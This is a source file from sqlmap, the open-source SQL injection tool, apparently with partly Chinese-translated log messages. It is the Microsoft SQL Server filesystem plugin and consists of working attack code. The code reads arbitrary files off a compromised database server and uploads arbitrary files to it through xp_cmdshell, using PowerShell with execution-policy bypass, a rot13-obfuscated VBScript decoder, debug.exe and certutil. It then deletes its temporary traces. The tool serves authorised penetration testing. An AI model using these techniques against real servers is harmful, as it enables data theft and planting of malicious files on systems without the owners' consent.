#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import ntpath
import os

from lib.core.common import checkFile
from lib.core.common import getLimitRange
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import posixToNtSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.compat import xrange
from lib.core.convert import encodeBase64
from lib.core.convert import encodeHex
from lib.core.convert import rot13
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapNoneDataException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.request import inject

from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def _dataToScr(self, fileContent, chunkName):
        fileLines = []
        fileSize = len(fileContent)
        lineAddr = 0x100
        lineLen = 20

        fileLines.append("n %s" % chunkName)
        fileLines.append("rcx")
        fileLines.append("%x" % fileSize)
        fileLines.append("f 0100 %x 00" % fileSize)

        for fileLine in xrange(0, len(fileContent), lineLen):
            scrString = ""

            for lineChar in fileContent[fileLine:fileLine + lineLen]:
                strLineChar = encodeHex(lineChar, binary=False)

                if not scrString:
                    scrString = "e %x %s" % (lineAddr, strLineChar)
                else:
                    scrString += " %s" % strLineChar

                lineAddr += len(strLineChar) // 2

            fileLines.append(scrString)

        fileLines.append("w")
        fileLines.append("q")

        return fileLines

    def _updateDestChunk(self, fileContent, tmpPath):
        randScr = "tmpf%s.scr" % randomStr(lowercase=True)
        chunkName = randomStr(lowercase=True)
        fileScrLines = self._dataToScr(fileContent, chunkName)

        logger.debug("正在将调试脚本上传到 %s\\%s,请稍候.." % (tmpPath, randScr))

        self.xpCmdshellWriteFile(fileScrLines, tmpPath, randScr)

        logger.debug("generating chunk file %s\\%s from debug script %s" % (tmpPath, chunkName, randScr))

        commands = (
            "cd \"%s\"" % tmpPath,
            "debug < %s" % randScr,
            "del /F /Q %s" % randScr
        )

        self.execCmd(" & ".join(command for command in commands))

        return chunkName

    def stackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "正在获取文件: '%s'" % remoteFile
            logger.info(infoMsg)

        result = []
        txtTbl = self.fileTblName
        hexTbl = "%s%shex" % (self.fileTblName, randomStr())

        self.createSupportTbl(txtTbl, self.tblField, "text")
        inject.goStacked("DROP TABLE %s" % hexTbl)
        inject.goStacked("CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)" % (hexTbl, self.tblField, "VARCHAR(4096)"))

        logger.debug("loading the content of file '%s' into support table" % remoteFile)
        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (txtTbl, remoteFile, randomStr(10), randomStr(10)), silent=True)

        # Reference: https://web.archive.org/web/20120211184457/http://support.microsoft.com/kb/104829
        binToHexQuery = """DECLARE charset VARCHAR(16)
        DECLARE counter INT
        DECLARE hexstr VARCHAR(4096)
        DECLARE length INT
        DECLARE chunk INT

        SET charset = '0123456789ABCDEF'
        SET counter = 1
        SET hexstr = ''
        SET length = (SELECT DATALENGTH(%s) FROM %s)
        SET chunk = 1024

        WHILE (counter <= length)
        BEGIN
            DECLARE tempint INT
            DECLARE firstint INT
            DECLARE secondint INT

            SET tempint = CONVERT(INT, (SELECT ASCII(SUBSTRING(%s, counter, 1)) FROM %s))
            SET firstint = floor(tempint/16)
            SET secondint = tempint - (firstint * 16)
            SET hexstr = hexstr + SUBSTRING(charset, firstint+1, 1) + SUBSTRING(charset, secondint+1, 1)

            SET counter = counter + 1

            IF counter %% chunk = 0
            BEGIN
                INSERT INTO %s(%s) VALUES(hexstr)
                SET hexstr = ''
            END
        END

        IF counter %% (chunk) != 0
        BEGIN
            INSERT INTO %s(%s) VALUES(hexstr)
        END
        """ % (self.tblField, txtTbl, self.tblField, txtTbl, hexTbl, self.tblField, hexTbl, self.tblField)

        binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
        inject.goStacked(binToHexQuery)

        if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), resumeValue=False, blind=False, time=False, error=False)

        if not result:
            result = []
            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

            if not isNumPosStrValue(count):
                errMsg = "无法获取文件 '%s' 的内容" % remoteFile
                raise SqlmapNoneDataException(errMsg)

            indexRange = getLimitRange(count)

            for index in indexRange:
                chunk = inject.getValue("SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC" % (self.tblField, hexTbl, self.tblField, index, self.tblField, hexTbl), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                result.append(chunk)

        inject.goStacked("DROP TABLE %s" % hexTbl)

        return result

    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = "Microsoft SQL Server不支持使用UNION查询SQL注入技术进行文件上传"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def _stackedWriteFilePS(self, tmpPath, localFileContent, remoteFile, fileType):
        infoMsg = "使用PowerShell将%s文件内容写入文件'%s'" % (fileType, remoteFile)
        logger.info(infoMsg)


        encodedFileContent = encodeBase64(localFileContent, binary=False)
        encodedBase64File = "tmpf%s.txt" % randomStr(lowercase=True)
        encodedBase64FilePath = "%s\\%s" % (tmpPath, encodedBase64File)

        randPSScript = "tmpps%s.ps1" % randomStr(lowercase=True)
        randPSScriptPath = "%s\\%s" % (tmpPath, randPSScript)

        localFileSize = len(encodedFileContent)
        chunkMaxSize = 1024

        logger.debug("uploading the base64-encoded file to %s, please wait.." % encodedBase64FilePath)

        for i in xrange(0, localFileSize, chunkMaxSize):
            wEncodedChunk = encodedFileContent[i:i + chunkMaxSize]
            self.xpCmdshellWriteFile(wEncodedChunk, tmpPath, encodedBase64File)

        psString = "$Base64 = Get-Content -Path \"%s\"; " % encodedBase64FilePath
        psString += "$Base64 = $Base64 -replace \"`t|`n|`r\",\"\"; $Content = "
        psString += "[System.Convert]::FromBase64String($Base64); Set-Content "
        psString += "-Path \"%s\" -Value $Content -Encoding Byte" % remoteFile

        logger.debug("uploading the PowerShell base64-decoding script to %s" % randPSScriptPath)
        self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)

        logger.debug("executing the PowerShell base64-decoding script to write the %s file, please wait.." % remoteFile)

        commands = (
            "powershell -ExecutionPolicy ByPass -File \"%s\"" % randPSScriptPath,
            "del /F /Q \"%s\"" % encodedBase64FilePath,
            "del /F /Q \"%s\"" % randPSScriptPath
        )

        self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileDebugExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
        infoMsg = "使用debug.exe将%s文件内容写入文件'%s',请稍候.." % (fileType, remoteFile)
        logger.info(infoMsg)

        remoteFileName = ntpath.basename(remoteFile)
        sFile = "%s\\%s" % (tmpPath, remoteFileName)
        localFileSize = os.path.getsize(localFile)
        debugSize = 0xFF00

        if localFileSize < debugSize:
            chunkName = self._updateDestChunk(localFileContent, tmpPath)

            debugMsg = "将分块文件 %s\\%s 重命名为 %s 文件 %s\\%s,并将其移动到 %s" % (tmpPath, chunkName, fileType, tmpPath, remoteFileName, remoteFile)
            logger.debug(debugMsg)

            commands = (
                "cd \"%s\"" % tmpPath,
                "ren %s %s" % (chunkName, remoteFileName),
                "move /Y %s %s" % (remoteFileName, remoteFile)
            )

            self.execCmd(" & ".join(command for command in commands))
        else:
            debugMsg = "文件大小超过 %d 字节。sqlmap将在本地将其拆分为分块,逐个分块上传,并在服务器上重新创建原始文件,请稍候.." % debugSize
            logger.debug(debugMsg)

            for i in xrange(0, localFileSize, debugSize):
                localFileChunk = localFileContent[i:i + debugSize]
                chunkName = self._updateDestChunk(localFileChunk, tmpPath)

                if i == 0:
                    debugMsg = "重命名分块文件 %s\\%s 为 %s 文件 %s\\%s" % (tmpPath, chunkName, fileType, tmpPath, remoteFileName)
                    copyCmd = "ren %s %s" % (chunkName, remoteFileName)
                else:
                    debugMsg = "追加分块文件 %s\\%s 到 %s 文件 %s\\%s" % (tmpPath, chunkName, fileType, tmpPath, remoteFileName)
                    copyCmd = "copy /B /Y %s+%s %s" % (remoteFileName, chunkName, remoteFileName)

                debugMsg += "%s\\%s 到 %s 文件 %s\\%s" % (tmpPath, chunkName, fileType, tmpPath, remoteFileName)
                logger.debug(debugMsg)

                commands = (
                    "cd \"%s\"" % tmpPath,
                    copyCmd,
                    "del /F /Q %s" % chunkName
                )

                self.execCmd(" & ".join(command for command in commands))

            logger.debug("将 %s 文件 %s 移动到 %s" % (fileType, sFile, remoteFile))

            commands = (
                "cd \"%s\"" % tmpPath,
                "move /Y %s %s" % (remoteFileName, remoteFile)
            )

            self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileVbs(self, tmpPath, localFileContent, remoteFile, fileType):
        infoMsg = "使用自定义的Visual Basic脚本将%s文件内容写入文件'%s',请稍候.." % (fileType, remoteFile)
        logger.info(infoMsg)

        randVbs = "tmps%s.vbs" % randomStr(lowercase=True)
        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
        randFilePath = "%s\\%s" % (tmpPath, randFile)

        vbs = """Qvz vachgSvyrCngu, bhgchgSvyrCngu
        vachgSvyrCngu = "%f"
        bhgchgSvyrCngu = "%f"
        Frg sf = PerngrBowrpg("Fpevcgvat.SvyrFlfgrzBowrpg")
        Frg svyr = sf.TrgSvyr(vachgSvyrCngu)
        Vs svyr.Fvmr Gura
            Jfpevcg.Rpub "Ybnqvat sebz: " & vachgSvyrCngu
            Jfpevcg.Rpub
            Frg sq = sf.BcraGrkgSvyr(vachgSvyrCngu, 1)
            qngn = sq.ErnqNyy
            sq.Pybfr
            qngn = Ercynpr(qngn, " ", "")
            qngn = Ercynpr(qngn, ioPe, "")
            qngn = Ercynpr(qngn, ioYs, "")
            Jfpevcg.Rpub "Svkrq Vachg: "
            Jfpevcg.Rpub qngn
            Jfpevcg.Rpub
            qrpbqrqQngn = onfr64_qrpbqr(qngn)
            Jfpevcg.Rpub "Bhgchg: "
            Jfpevcg.Rpub qrpbqrqQngn
            Jfpevcg.Rpub
            Jfpevcg.Rpub "Jevgvat bhgchg va: " & bhgchgSvyrCngu
            Jfpevcg.Rpub
            Frg bsf = PerngrBowrpg("Fpevcgvat.SvyrFlfgrzBowrpg").BcraGrkgSvyr(bhgchgSvyrCngu, 2, Gehr)
            bsf.Jevgr qrpbqrqQngn
            bsf.pybfr
        Ryfr
            Jfpevcg.Rpub "Gur svyr vf rzcgl."
        Raq Vs
        Shapgvba onfr64_qrpbqr(olIny fgeVa)
            Qvz j1, j2, j3, j4, a, fgeBhg
            Sbe a = 1 Gb Yra(fgeVa) Fgrc 4
                j1 = zvzrqrpbqr(Zvq(fgeVa, a, 1))
                j2 = zvzrqrpbqr(Zvq(fgeVa, a + 1, 1))
                j3 = zvzrqrpbqr(Zvq(fgeVa, a + 2, 1))
                j4 = zvzrqrpbqr(Zvq(fgeVa, a + 3, 1))
                Vs Abg j2 Gura _
                fgeBhg = fgeBhg + Pue(((j1 * 4 + Vag(j2 / 16)) Naq 255))
                Vs  Abg j3 Gura _
                fgeBhg = fgeBhg + Pue(((j2 * 16 + Vag(j3 / 4)) Naq 255))
                Vs Abg j4 Gura _
                fgeBhg = fgeBhg + Pue(((j3 * 64 + j4) Naq 255))
            Arkg
            onfr64_qrpbqr = fgeBhg
        Shapgvba zvzrqrpbqr(olIny fgeVa)
            Onfr64Punef = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/"
            Vs Yra(fgeVa) = 0 Gura
                zvzrqrpbqr = -1 : Rkvg Shapgvba
            Ryfr
                zvzrqrpbqr = VaFge(Onfr64Punef, fgeVa) - 1
            Raq Vs
        Raq Shapgvba"""

        # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5581
        vbs = rot13(vbs)
        vbs = vbs.replace("    ", "")
        encodedFileContent = encodeBase64(localFileContent, binary=False)

        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)

        self.xpCmdshellWriteFile(encodedFileContent, tmpPath, randFile)

        logger.debug("uploading a visual basic decoder stub %s\\%s, please wait.." % (tmpPath, randVbs))

        self.xpCmdshellWriteFile(vbs, tmpPath, randVbs)

        commands = (
            "cd \"%s\"" % tmpPath,
            "cscript //nologo %s" % randVbs,
            "del /F /Q %s" % randVbs,
            "del /F /Q %s" % randFile
        )

        self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileCertutilExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
        infoMsg = "使用certutil.exe将%s文件内容写入文件'%s',请稍候.." % (fileType, remoteFile)
        logger.info(infoMsg)

        chunkMaxSize = 500

        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
        randFilePath = "%s\\%s" % (tmpPath, randFile)

        encodedFileContent = encodeBase64(localFileContent, binary=False)

        splittedEncodedFileContent = '\n'.join([encodedFileContent[i:i + chunkMaxSize] for i in xrange(0, len(encodedFileContent), chunkMaxSize)])

        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)

        self.xpCmdshellWriteFile(splittedEncodedFileContent, tmpPath, randFile)

        logger.debug("decoding the file to %s.." % remoteFile)

        commands = (
            "cd \"%s\"" % tmpPath,
            "certutil -f -decode %s %s" % (randFile, remoteFile),
            "del /F /Q %s" % randFile
        )

        self.execCmd(" & ".join(command for command in commands))

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        # NOTE: this is needed here because we use xp_cmdshell extended
        # procedure to write a file on the back-end Microsoft SQL Server
        # file system
        self.initEnv()
        self.getRemoteTempPath()

        tmpPath = posixToNtSlashes(conf.tmpPath)
        remoteFile = posixToNtSlashes(remoteFile)

        checkFile(localFile)
        localFileContent = open(localFile, "rb").read()

        self._stackedWriteFilePS(tmpPath, localFileContent, remoteFile, fileType)
        written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = "是否尝试使用自定义的Visual Basic脚本技术上传文件？[Y/n] "

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileVbs(tmpPath, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = "是否尝试使用内置的debug.exe技术上传文件？[Y/n] "

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileDebugExe(tmpPath, localFile, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = "是否尝试使用内置的certutil.exe技术上传文件？[Y/n] "

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileCertutilExe(tmpPath, localFile, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        return written
